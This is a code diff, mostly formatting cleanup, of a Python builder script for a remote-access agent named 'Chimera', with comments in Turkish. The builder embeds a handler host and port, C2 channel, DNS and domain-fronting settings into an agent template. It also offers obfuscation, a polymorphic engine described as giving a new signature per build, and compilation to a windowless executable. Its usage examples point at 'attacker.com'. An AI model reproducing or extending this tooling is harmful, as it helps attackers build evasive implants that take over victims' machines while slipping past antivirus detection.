@@ -20,20 +20,21 @@ Planlanan Özellikler:
     - Exe dönüştürme (PyInstaller/Nuitka entegrasyonu)
 """
 
-import os
-import sys
-import hashlib
-import time
-import re
-import ipaddress
 import argparse
-import subprocess
+import hashlib
+import ipaddress
+import os
+import re
 import shutil
+import subprocess
+import sys
 from datetime import datetime
 
 # Obfuscator kütüphanesini içe aktarmaya çalış
 try:
-    from build.chimera_obfuscator import obfuscate as _run_obfuscator, print_obfuscation_report
+    from build.chimera_obfuscator import obfuscate as _run_obfuscator
+    from build.chimera_obfuscator import print_obfuscation_report
+
     _OBFUSCATOR_AVAILABLE = True
 except ImportError:
     try:
@@ -41,14 +42,17 @@ except ImportError:
         _project_root = os.path.dirname(_builder_dir)
         if _project_root not in sys.path:
             sys.path.insert(0, _project_root)
-        from build.chimera_obfuscator import obfuscate as _run_obfuscator, print_obfuscation_report
+        from build.chimera_obfuscator import obfuscate as _run_obfuscator
+        from build.chimera_obfuscator import print_obfuscation_report
+
         _OBFUSCATOR_AVAILABLE = True
     except ImportError:
         _OBFUSCATOR_AVAILABLE = False
 
 # Polimorfik engine'i içe aktarmaya çalış
 try:
-    from build.chimera_polymorphic import polymorphic_wrap as _run_polymorphic, print_polymorphic_report
+    from build.chimera_polymorphic import polymorphic_wrap as _run_polymorphic
+
     _POLYMORPHIC_AVAILABLE = True
 except ImportError:
     try:
@@ -56,11 +60,11 @@ except ImportError:
         _project_root = os.path.dirname(_builder_dir)
         if _project_root not in sys.path:
             sys.path.insert(0, _project_root)
-        from build.chimera_polymorphic import polymorphic_wrap as _run_polymorphic, print_polymorphic_report
+        from build.chimera_polymorphic import polymorphic_wrap as _run_polymorphic
+
         _POLYMORPHIC_AVAILABLE = True
     except ImportError:
         _POLYMORPHIC_AVAILABLE = False
-
 
 
 # ============================================================
@@ -153,7 +157,7 @@ def validate_host(host: str) -> bool:
 
     # Hostname kontrolü (RFC 1123)
     hostname_regex = re.compile(
-        r'^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z0-9-]{1,63})*$'
+        r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z0-9-]{1,63})*$"
     )
     return bool(hostname_regex.match(host))
 
@@ -185,13 +189,13 @@ def build_payload(
     channel_type: str = "https",
     dns_domain: str = "",
     fronting_domain: str = "",
-    output_path: str = None,
-    agent_source_path: str = None,
+    output_path: str | None = None,
+    agent_source_path: str | None = None,
     strip_comments: bool = False,
     obfuscate: bool = False,
     polymorphic: bool = False,
     build_bin: bool = False,
-    quiet: bool = False
+    quiet: bool = False,
 ) -> dict:
     """Chimera agent payload'ını oluşturur.
 
@@ -228,26 +232,34 @@ def build_payload(
         "error": None,
         "stats": {},
         "obfuscation_stats": {},
-        "polymorphic_mutations": []
+        "polymorphic_mutations": [],
     }
 
     # --- Doğrulama ---
     if not validate_host(lhost):
-        result["error"] = f"[!] Geçersiz LHOST değeri: '{lhost}'. Geçerli bir IP veya hostname girin."
+        result["error"] = (
+            f"[!] Geçersiz LHOST değeri: '{lhost}'. Geçerli bir IP veya hostname girin."
+        )
         return result
 
     if not validate_port(lport):
-        result["error"] = f"[!] Geçersiz LPORT değeri: '{lport}'. 1-65535 arası bir port girin."
+        result["error"] = (
+            f"[!] Geçersiz LPORT değeri: '{lport}'. 1-65535 arası bir port girin."
+        )
         return result
 
     lport = int(lport)
 
     if not isinstance(reconnect_delay, int) or reconnect_delay < 0:
-        result["error"] = f"[!] Geçersiz RECONNECT_DELAY: '{reconnect_delay}'. Pozitif bir tamsayı olmalı."
+        result["error"] = (
+            f"[!] Geçersiz RECONNECT_DELAY: '{reconnect_delay}'. Pozitif bir tamsayı olmalı."
+        )
         return result
 
     if not isinstance(max_reconnect, int):
-        result["error"] = f"[!] Geçersiz MAX_RECONNECT: '{max_reconnect}'. Tamsayı olmalı (-1 = sınırsız)."
+        result["error"] = (
+            f"[!] Geçersiz MAX_RECONNECT: '{max_reconnect}'. Tamsayı olmalı (-1 = sınırsız)."
+        )
         return result
 
     # --- Agent kaynak kodunu oku ---
@@ -262,7 +274,7 @@ def build_payload(
         return result
 
     try:
-        with open(src_path, "r", encoding="utf-8") as f:
+        with open(src_path, encoding="utf-8") as f:
             agent_code = f.read()
     except Exception as e:
         result["error"] = f"[!] Agent dosyası okunamadı: {e}"
@@ -271,14 +283,14 @@ def build_payload(
     original_size = len(agent_code.encode("utf-8"))
 
     # --- Placeholder kontrolü ---
-    if '{{LHOST}}' not in agent_code:
+    if "{{LHOST}}" not in agent_code:
         result["error"] = (
             "[!] Agent kodunda '{{LHOST}}' placeholder'ı bulunamadı. "
             "Kod zaten build edilmiş olabilir."
         )
         return result
 
-    if '{{LPORT}}' not in agent_code:
+    if "{{LPORT}}" not in agent_code:
         result["error"] = (
             "[!] Agent kodunda '{{LPORT}}' placeholder'ı bulunamadı. "
             "Kod zaten build edilmiş olabilir."
@@ -286,34 +298,24 @@ def build_payload(
         return result
 
     # --- Konfigürasyon değerlerini göm ---
+    agent_code = agent_code.replace('LHOST = "{{LHOST}}"', f'LHOST = "{lhost}"')
+    agent_code = agent_code.replace("LPORT = {{LPORT}}", f"LPORT = {lport}")
     agent_code = agent_code.replace(
-        'LHOST = "{{LHOST}}"',
-        f'LHOST = "{lhost}"'
+        "RECONNECT_DELAY = 5", f"RECONNECT_DELAY = {reconnect_delay}"
     )
     agent_code = agent_code.replace(
-        "LPORT = {{LPORT}}",
-        f"LPORT = {lport}"
-    )
-    agent_code = agent_code.replace(
-        f"RECONNECT_DELAY = 5",
-        f"RECONNECT_DELAY = {reconnect_delay}"
-    )
-    agent_code = agent_code.replace(
-        f"MAX_RECONNECT = -1",
-        f"MAX_RECONNECT = {max_reconnect}"
+        "MAX_RECONNECT = -1", f"MAX_RECONNECT = {max_reconnect}"
     )
     # İletişim kanalı konfigürasyonları
     agent_code = agent_code.replace(
-        'CHANNEL_TYPE = "{{CHANNEL_TYPE}}"',
-        f'CHANNEL_TYPE = "{channel_type}"'
+        'CHANNEL_TYPE = "{{CHANNEL_TYPE}}"', f'CHANNEL_TYPE = "{channel_type}"'
     )
     agent_code = agent_code.replace(
-        'DNS_DOMAIN = "{{DNS_DOMAIN}}"',
-        f'DNS_DOMAIN = "{dns_domain}"'
+        'DNS_DOMAIN = "{{DNS_DOMAIN}}"', f'DNS_DOMAIN = "{dns_domain}"'
     )
     agent_code = agent_code.replace(
         'FRONTING_DOMAIN = "{{FRONTING_DOMAIN}}"',
-        f'FRONTING_DOMAIN = "{fronting_domain}"'
+        f'FRONTING_DOMAIN = "{fronting_domain}"',
     )
 
     # --- Yorum satırlarını kaldır (opsiyonel) ---
@@ -385,11 +387,11 @@ def build_payload(
                 result["obfuscation_stats"] = obf_result["stats"]
                 # Hash ve boyut istatistiklerini güncelle
                 final_enc = agent_code.encode("utf-8")
-                result["stats"]["final_size"]  = len(final_enc)
-                result["stats"]["line_count"]  = agent_code.count("\n") + 1
-                result["stats"]["md5"]         = hashlib.md5(final_enc).hexdigest()
-                result["stats"]["sha256"]      = hashlib.sha256(final_enc).hexdigest()
-                result["stats"]["obfuscated"]  = True
+                result["stats"]["final_size"] = len(final_enc)
+                result["stats"]["line_count"] = agent_code.count("\n") + 1
+                result["stats"]["md5"] = hashlib.md5(final_enc).hexdigest()
+                result["stats"]["sha256"] = hashlib.sha256(final_enc).hexdigest()
+                result["stats"]["obfuscated"] = True
             else:
                 if not quiet:
                     print(f"[!] Obfuscation başarısız: {obf_result['error']}")
@@ -398,7 +400,9 @@ def build_payload(
     if polymorphic:
         if not _POLYMORPHIC_AVAILABLE:
             if not quiet:
-                print("[!] UYARI: chimera_polymorphic yüklenemedi, polimorfik dönüşüm atlandı.")
+                print(
+                    "[!] UYARI: chimera_polymorphic yüklenemedi, polimorfik dönüşüm atlandı."
+                )
         else:
             if not quiet:
                 print("[*] Polimorfik dönüşüm uygulanıyor...")
@@ -409,10 +413,10 @@ def build_payload(
                 result["polymorphic_mutations"] = poly_result["mutations"]
                 # Hash ve boyut istatistiklerini güncelle
                 final_enc = agent_code.encode("utf-8")
-                result["stats"]["final_size"]  = len(final_enc)
-                result["stats"]["line_count"]  = agent_code.count("\n") + 1
-                result["stats"]["md5"]         = hashlib.md5(final_enc).hexdigest()
-                result["stats"]["sha256"]      = hashlib.sha256(final_enc).hexdigest()
+                result["stats"]["final_size"] = len(final_enc)
+                result["stats"]["line_count"] = agent_code.count("\n") + 1
+                result["stats"]["md5"] = hashlib.md5(final_enc).hexdigest()
+                result["stats"]["sha256"] = hashlib.sha256(final_enc).hexdigest()
                 result["stats"]["polymorphic"] = True
             else:
                 if not quiet:
@@ -429,7 +433,9 @@ def build_payload(
         if not py_path.endswith(".py") and not build_bin:
             py_path += ".py"
         elif build_bin:
-            py_path = output_path + ".py" if not output_path.endswith(".py") else output_path
+            py_path = (
+                output_path + ".py" if not output_path.endswith(".py") else output_path
+            )
 
         # Çıktı dizinini oluştur
         output_dir = os.path.dirname(output_path)
@@ -455,50 +461,62 @@ def build_payload(
 
         if build_bin:
             if not quiet:
-                print("[*] PyInstaller ile yürütülebilir dosyaya dönüştürülüyor (bu işlem biraz vakit alabilir)...")
+                print(
+                    "[*] PyInstaller ile yürütülebilir dosyaya dönüştürülüyor (bu işlem biraz vakit alabilir)..."
+                )
             try:
                 exe_out_dir = os.path.dirname(os.path.abspath(result["output_path"]))
                 pyinstaller_cmd = [
-                    sys.executable, "-m", "PyInstaller",
+                    sys.executable,
+                    "-m",
+                    "PyInstaller",
                     "--onefile",
                     "--noconsole",
                     "--noconfirm",
-                    "--distpath", exe_out_dir,
-                    os.path.abspath(py_path)
+                    "--distpath",
+                    exe_out_dir,
+                    os.path.abspath(py_path),
                 ]
-                
+
                 process = subprocess.run(
-                    pyinstaller_cmd,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True
+                    pyinstaller_cmd, capture_output=True, text=True
                 )
-                
+
                 if process.returncode != 0:
-                    result["error"] = f"[!] Derleme hatası: PyInstaller başarısız oldu.\nAyrıntılı Hata:\n{process.stderr}"
+                    result["error"] = (
+                        f"[!] Derleme hatası: PyInstaller başarısız oldu.\nAyrıntılı Hata:\n{process.stderr}"
+                    )
                     result["success"] = False
                     return result
-                    
+
                 # PyInstaller başarılı, derlenen dosyayı bul
                 base_name = os.path.splitext(os.path.basename(py_path))[0]
                 # PyInstaller genellikle .exe üretir (Win/Linux farketmeksizin PE olarak hedeflenmişse vs ama aslında linux'ta uzantısız ELF çıkarır).
-                expected_out_name = base_name + (".exe" if sys.platform == "win32" else "")
+                expected_out_name = base_name + (
+                    ".exe" if sys.platform == "win32" else ""
+                )
                 expected_out_path = os.path.join(exe_out_dir, expected_out_name)
-                
+
                 # Eğer output_path belirli bir isimse ve expected_out_path ondan farklıysa
                 final_output = output_path
                 if sys.platform == "win32" and not final_output.endswith(".exe"):
                     final_output += ".exe"
-                    
+
                 # Eğer farklıysa taşı
-                if os.path.exists(expected_out_path) and os.path.abspath(expected_out_path) != os.path.abspath(final_output):
+                if os.path.exists(expected_out_path) and os.path.abspath(
+                    expected_out_path
+                ) != os.path.abspath(final_output):
                     shutil.move(expected_out_path, final_output)
-                elif not os.path.exists(expected_out_path) and not sys.platform == "win32":
+                elif not os.path.exists(expected_out_path) and sys.platform != "win32":
                     # Linux için Pyinstaller uzantısız üretmiş olabilir
-                    if os.path.exists(os.path.join(exe_out_dir, base_name)) and os.path.abspath(os.path.join(exe_out_dir, base_name)) != os.path.abspath(final_output):
-                       shutil.move(os.path.join(exe_out_dir, base_name), final_output) 
-                       expected_out_path = os.path.join(exe_out_dir, base_name)
-                
+                    if os.path.exists(
+                        os.path.join(exe_out_dir, base_name)
+                    ) and os.path.abspath(
+                        os.path.join(exe_out_dir, base_name)
+                    ) != os.path.abspath(final_output):
+                        shutil.move(os.path.join(exe_out_dir, base_name), final_output)
+                        expected_out_path = os.path.join(exe_out_dir, base_name)
+
                 if os.path.exists(final_output):
                     result["output_path"] = os.path.abspath(final_output)
                 elif os.path.exists(expected_out_path):
@@ -506,11 +524,11 @@ def build_payload(
 
                 result["stats"]["build_bin"] = True
                 result["stats"]["final_size"] = os.path.getsize(result["output_path"])
-                
+
                 # PyInstaller kalıntılarını temizle
                 spec_file = os.path.join(os.getcwd(), base_name + ".spec")
                 build_dir = os.path.join(os.getcwd(), "build", base_name)
-                
+
                 # macOS .app kalıntıları (noconsole/windowed flag sebebiyle oluşabilen klasörler)
                 app_dir_cwd = os.path.join(os.getcwd(), base_name + ".app")
                 app_dir_out = os.path.join(exe_out_dir, base_name + ".app")
@@ -524,9 +542,11 @@ def build_payload(
                         shutil.rmtree(app_dir_cwd)
                     if os.path.exists(app_dir_out):
                         shutil.rmtree(app_dir_out)
-                    
+
             except Exception as e:
-                result["error"] = f"[!] Derleme sırasında beklenmedik sistem hatası: {e}"
+                result["error"] = (
+                    f"[!] Derleme sırasında beklenmedik sistem hatası: {e}"
+                )
                 result["success"] = False
                 return result
 
@@ -547,53 +567,55 @@ def print_build_report(result: dict):
     border = "═" * 58
 
     print(f"\n  ╔{border}╗")
-    print(f"  ║  🐍  CHIMERA BUILDER - Build Raporu                     ║")
+    print("  ║  🐍  CHIMERA BUILDER - Build Raporu                     ║")
     print(f"  ╠{border}╣")
-    print(f"  ║  Durum         : ✅ Başarılı                            ║")
+    print("  ║  Durum         : ✅ Başarılı                            ║")
     print(f"  ║  Zaman         : {stats['build_time']:<39}║")
     print(f"  ╠{border}╣")
-    print(f"  ║  📡 Konfigürasyon                                       ║")
+    print("  ║  📡 Konfigürasyon                                       ║")
     print(f"  ║  ├─ LHOST           : {stats['lhost']:<35}║")
-    print(f"  ║  ├─ LPORT           : {str(stats['lport']):<35}║")
-    print(f"  ║  ├─ RECONNECT_DELAY : {str(stats['reconnect_delay']):<35}║")
-    print(f"  ║  └─ MAX_RECONNECT   : {str(stats['max_reconnect']):<35}║")
+    print(f"  ║  ├─ LPORT           : {stats['lport']!s:<35}║")
+    print(f"  ║  ├─ RECONNECT_DELAY : {stats['reconnect_delay']!s:<35}║")
+    print(f"  ║  └─ MAX_RECONNECT   : {stats['max_reconnect']!s:<35}║")
     print(f"  ╠{border}╣")
-    print(f"  ║  📦 Payload Bilgileri                                    ║")
-    print(f"  ║  ├─ Kaynak Dosya    : agent.py                          ║")
+    print("  ║  📦 Payload Bilgileri                                    ║")
+    print("  ║  ├─ Kaynak Dosya    : agent.py                          ║")
 
     # Boyut bilgisi
-    original_kb = stats['original_size'] / 1024
-    final_kb = stats['final_size'] / 1024
+    stats["original_size"] / 1024
+    final_kb = stats["final_size"] / 1024
     size_str = f"{stats['final_size']:,} bytes ({final_kb:.1f} KB)"
     print(f"  ║  ├─ Boyut           : {size_str:<35}║")
-    print(f"  ║  ├─ Satır Sayısı    : {str(stats['line_count']):<35}║")
+    print(f"  ║  ├─ Satır Sayısı    : {stats['line_count']!s:<35}║")
 
-    if stats['strip_comments']:
-        saved = stats['original_size'] - stats['final_size']
-        saved_pct = (saved / stats['original_size']) * 100 if stats['original_size'] > 0 else 0
+    if stats["strip_comments"]:
+        saved = stats["original_size"] - stats["final_size"]
+        saved_pct = (
+            (saved / stats["original_size"]) * 100 if stats["original_size"] > 0 else 0
+        )
         strip_str = f"Evet (-%{saved_pct:.1f}, -{saved:,} bytes)"
         print(f"  ║  ├─ Yorum Temizleme : {strip_str:<35}║")
 
-    obf_flag = stats.get('obfuscated', False)
+    obf_flag = stats.get("obfuscated", False)
     obf_str = "✅ Evet" if obf_flag else "Hayır"
     print(f"  ║  ├─ Obfuscation     : {obf_str:<35}║")
 
-    bin_flag = stats.get('build_bin', False)
+    bin_flag = stats.get("build_bin", False)
     bin_str = "✅ Evet" if bin_flag else "Hayır"
     print(f"  ║  ├─ İkili Derleme   : {bin_str:<35}║")
 
-    poly_flag = stats.get('polymorphic', False)
+    poly_flag = stats.get("polymorphic", False)
     poly_str = "✅ Evet" if poly_flag else "Hayır"
     print(f"  ║  ├─ Polimorfik      : {poly_str:<35}║")
 
     print(f"  ╠{border}╣")
-    print(f"  ║  🔐 Hash Değerleri                                      ║")
+    print("  ║  🔐 Hash Değerleri                                      ║")
     print(f"  ║  ├─ MD5    : {stats['md5']:<44}║")
     print(f"  ║  └─ SHA256 : {stats['sha256'][:44]:<44}║")
 
     if result["output_path"]:
         print(f"  ╠{border}╣")
-        print(f"  ║  💾 Çıktı Dosyası                                      ║")
+        print("  ║  💾 Çıktı Dosyası                                      ║")
         # Yolu kısalt (çok uzunsa)
         out_display = result["output_path"]
         if len(out_display) > 44:
@@ -601,10 +623,9 @@ def print_build_report(result: dict):
         print(f"  ║  └─ {out_display:<53}║")
 
     print(f"  ╠{border}╣")
-    print(f"  ║  📋 Kullanım                                            ║")
-    print(f"  ║  └─ python3 <payload_dosyası>                           ║")
+    print("  ║  📋 Kullanım                                            ║")
+    print("  ║  └─ python3 <payload_dosyası>                           ║")
     print(f"  ╚{border}╝\n")
-
 
 
 # ============================================================
@@ -625,52 +646,62 @@ def main():
             "  %(prog)s --lhost 10.0.0.1 --lport 4444 -o /tmp/agent.py\n"
             "  %(prog)s --lhost 192.168.1.50 --lport 8080 --strip-comments -o payload.py\n"
             "  %(prog)s --lhost attacker.com --lport 443 --reconnect-delay 10 -o chimera.py\n"
-        )
+        ),
     )
 
     parser.add_argument(
-        "--lhost", required=True,
-        help="Handler IP adresi veya hostname (zorunlu)."
+        "--lhost", required=True, help="Handler IP adresi veya hostname (zorunlu)."
     )
     parser.add_argument(
-        "--lport", type=int, required=True,
-        help="Handler port numarası (zorunlu, 1-65535)."
+        "--lport",
+        type=int,
+        required=True,
+        help="Handler port numarası (zorunlu, 1-65535).",
     )
     parser.add_argument(
-        "-o", "--output", required=True,
-        help="Payload çıktı dosya yolu (zorunlu)."
+        "-o", "--output", required=True, help="Payload çıktı dosya yolu (zorunlu)."
     )
     parser.add_argument(
-        "--reconnect-delay", type=int, default=5,
-        help="Yeniden bağlanma bekleme süresi, saniye (varsayılan: 5)."
+        "--reconnect-delay",
+        type=int,
+        default=5,
+        help="Yeniden bağlanma bekleme süresi, saniye (varsayılan: 5).",
     )
     parser.add_argument(
-        "--max-reconnect", type=int, default=-1,
-        help="Maksimum yeniden bağlanma denemesi, -1=sınırsız (varsayılan: -1)."
+        "--max-reconnect",
+        type=int,
+        default=-1,
+        help="Maksimum yeniden bağlanma denemesi, -1=sınırsız (varsayılan: -1).",
     )
     parser.add_argument(
         "--agent-source",
-        help="Özel agent kaynak dosyası yolu (varsayılan: otomatik bulunur)."
+        help="Özel agent kaynak dosyası yolu (varsayılan: otomatik bulunur).",
     )
     parser.add_argument(
-        "--strip-comments", action="store_true",
-        help="Yorum satırlarını ve docstring'leri kaldır."
+        "--strip-comments",
+        action="store_true",
+        help="Yorum satırlarını ve docstring'leri kaldır.",
     )
     parser.add_argument(
-        "--obfuscate", action="store_true",
-        help="AST rename + XOR string şifreleme + junk code uygula."
+        "--obfuscate",
+        action="store_true",
+        help="AST rename + XOR string şifreleme + junk code uygula.",
     )
     parser.add_argument(
-        "--polymorphic", action="store_true",
-        help="Polimorfik engine uygula (her build farklı imza üretir)."
+        "--polymorphic",
+        action="store_true",
+        help="Polimorfik engine uygula (her build farklı imza üretir).",
     )
     parser.add_argument(
-        "--build-bin", action="store_true",
-        help="PyInstaller kullanarak çalıştırılabilir ikili dosyaya (binary) dönüştür."
+        "--build-bin",
+        action="store_true",
+        help="PyInstaller kullanarak çalıştırılabilir ikili dosyaya (binary) dönüştür.",
     )
     parser.add_argument(
-        "-q", "--quiet", action="store_true",
-        help="Sadece hata/başarı mesajı göster, detaylı rapor gösterme."
+        "-q",
+        "--quiet",
+        action="store_true",
+        help="Sadece hata/başarı mesajı göster, detaylı rapor gösterme.",
     )
 
     args = parser.parse_args()
@@ -690,8 +721,15 @@ def main():
     )
 
     # Obfuscation raporu (ayrı)
-    if args.obfuscate and result.get("obfuscation_stats") and not args.quiet and _OBFUSCATOR_AVAILABLE:
-        print_obfuscation_report({"success": True, "stats": result["obfuscation_stats"]})
+    if (
+        args.obfuscate
+        and result.get("obfuscation_stats")
+        and not args.quiet
+        and _OBFUSCATOR_AVAILABLE
+    ):
+        print_obfuscation_report(
+            {"success": True, "stats": result["obfuscation_stats"]}
+        )
 
     if args.quiet:
         if result["success"]:
